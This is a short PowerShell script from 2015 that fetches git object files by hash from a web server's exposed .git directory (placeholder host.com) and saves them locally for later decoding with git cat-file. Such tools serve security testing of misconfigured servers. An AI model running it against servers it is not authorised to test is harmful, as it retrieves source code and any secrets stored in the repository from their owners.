<#

.SYNOPSIS

Gathers info from an exposed .git directory on a web server

.DESCRIPTION

Gathers info from an exposed .git directory on a web server - needs a little work but can retrieve files from an exposed git repository

.NOTES

 Author: Tom Willett 
 Date:  12/23/2015

#>
Param([Parameter(Mandatory=$True,ValueFromPipeline=$True,ValueFromPipelinebyPropertyName=$True)][string]$hash)

process {
	$dir=$hash.substring(0,2)
	$file = $hash.substring(2)
	$git = 'https://host.com/.git/objects/'
	$gitDisk = 'S:\Systems\host\.git\objects\'
	mkdir ($gitDisk + $dir) -ErrorAction SilentlyContinue
	$url = $git + $dir + '/' + $file
	$fdisk = $gitDisk + $dir + '\' + $file
	$url
	$fdisk
	rm $fdisk -ErrorAction SilentlyContinue
	(new-object net.webclient).Downloadfile($url,$fdisk)
	$fdisk = $gitDisk + $dir + '\' + $file
	#cat ..\hashes.txt | %{git cat-file -p $_ >> ..\files.txt}
}